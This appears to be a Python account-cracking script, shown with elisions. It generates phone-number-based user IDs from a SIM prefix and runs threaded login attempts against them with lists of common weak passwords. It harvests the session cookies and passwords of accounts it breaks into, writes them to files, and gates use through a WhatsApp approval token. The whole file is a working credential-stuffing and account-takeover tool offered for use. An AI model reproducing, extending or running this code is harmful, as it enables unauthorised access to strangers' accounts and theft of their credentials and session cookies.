...
88      a8P    I8,        8        ,8I   88      a8P   
88    ,88'     `8b       d8b       d8'   88    ,88'    
88  ,88"        "8,     ,8"8,     ,8"    88  ,88"      
88,d88'          Y8     8P Y8     8P     88,d88'       
8888"88,         `8b   d8' `8b   d8'     8888"88,      
88P   Y8b         `8a a8'   `8a a8'      88P   Y8b     
88     "88,   888  `8a8'     `8a8'  888  88     "88,   
88       Y8b  888   `8'       `8'   888  88       Y8b  
...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mKERAMAT king\033[1;37m
[•] STATUS     : \033[1;32mFREE\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 20.6 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
--------------------------------------------------"""
...
def svn_digit():
	...
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :9378,9377,9370,9379.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print('[•]MAX LIMIT [2000]')
	print('[•]MAX LIMIT [3000]')
	print('[•]MAX LIMIT [5000]')
	print('[•]MAX LIMIT [10000]')
	lines()
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786','1234567','100200300']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
...
def malik_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'1234@#4','100@200@300','afg1234']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KERAMATking-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('KERAMATking-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[KERAMATking-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mKERAMATking\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+93792913215?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
